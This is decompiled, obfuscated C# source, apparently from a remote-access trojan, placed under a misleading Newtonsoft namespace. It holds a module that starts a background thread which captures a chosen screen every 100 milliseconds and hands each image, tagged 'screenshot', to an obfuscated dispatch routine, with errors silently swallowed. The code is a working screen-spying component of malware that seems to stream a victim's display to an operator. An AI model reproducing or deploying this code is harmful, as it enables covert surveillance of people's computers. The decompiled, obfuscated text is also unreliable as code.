using GDBD.Bridges;
using GDBD.Workers;
using Newtonsoft.Expressions;
using System;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

namespace Newtonsoft.Resolver
{
	internal sealed class ParamFilterResolver
	{
		[CompilerGenerated]
		private sealed class _0001
		{
			public int _0001;

			public int _0002;

			public string _0003;

			public string _0004;

			[MethodImpl(MethodImplOptions.NoInlining)]
			public _0001()
			{
				//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
				//IL_0003: Incompatible stack heights: 0 vs 1
				//IL_0007: Incompatible stack heights: 0 vs 1
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				SingletonReader.PushGlobal();
				base._002Ector();
			}
		}

		[CompilerGenerated]
		private sealed class _0002
		{
			public Screen _0001;

			public _0001 _0002;

			[MethodImpl(MethodImplOptions.NoInlining)]
			public _0002()
			{
				//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
				//IL_0003: Incompatible stack heights: 0 vs 1
				//IL_0007: Incompatible stack heights: 0 vs 1
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				SingletonReader.PushGlobal();
				base._002Ector();
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void _0001()
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				if ((_0002._0001 == 0) & (_0002._0002 == 0))
				{
					while (!rules)
					{
						try
						{
							DispatcherInstanceExpression.CustomizeFilter(ValClientBridge.PrepareList(ValClientBridge.IncludeList(this._0001)), "screenshot", _0002._0003, _0002._0004);
						}
						catch
						{
						}
						Thread.Sleep(100);
					}
				}
				else
				{
					while (!rules)
					{
						DispatcherInstanceExpression.CustomizeFilter(ValClientBridge.PrepareList(ValClientBridge.PushList(ValClientBridge.IncludeList(this._0001), _0002._0001, _0002._0002)), "screenshot", _0002._0003, _0002._0004);
						Thread.Sleep(100);
					}
				}
				rules = false;
			}
		}

		private static Thread m_Advisor;

		private static bool rules;

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static void PostEvent(string init, int flags_cont, int servend, string pol2, string config3)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			if (m_Advisor == null)
			{
				Screen value = Screen.PrimaryScreen;
				try
				{
					Screen[] allScreens = Screen.AllScreens;
					foreach (Screen screen in allScreens)
					{
						if (init == screen.DeviceName)
						{
							value = screen;
							break;
						}
					}
				}
				catch
				{
				}
				m_Advisor = new Thread((ThreadStart)delegate
				{
					//Discarded unreachable code: IL_0002
					//IL_0003: Incompatible stack heights: 0 vs 1
					if (flags_cont == 0 && servend == 0)
					{
						while (!rules)
						{
							try
							{
								DispatcherInstanceExpression.CustomizeFilter(ValClientBridge.PrepareList(ValClientBridge.IncludeList(value)), "screenshot", pol2, config3);
							}
							catch
							{
							}
							Thread.Sleep(100);
						}
					}
					else
					{
						while (!rules)
						{
							DispatcherInstanceExpression.CustomizeFilter(ValClientBridge.PrepareList(ValClientBridge.PushList(ValClientBridge.IncludeList(value), flags_cont, servend)), "screenshot", pol2, config3);
							Thread.Sleep(100);
						}
					}
					rules = false;
				});
				m_Advisor.Start();
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static void ChangeEvent()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			if (m_Advisor != null)
			{
				rules = true;
				while (rules)
				{
					Thread.Sleep(500);
				}
				m_Advisor = null;
				GC.Collect();
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public ParamFilterResolver()
		{
			//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
			//IL_0003: Incompatible stack heights: 0 vs 1
			//IL_0007: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			SingletonReader.PushGlobal();
			base._002Ector();
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		static ParamFilterResolver()
		{
			//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
			//IL_0003: Incompatible stack heights: 0 vs 1
			//IL_0007: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			SingletonReader.PushGlobal();
			m_Advisor = null;
			rules = false;
		}
	}
}
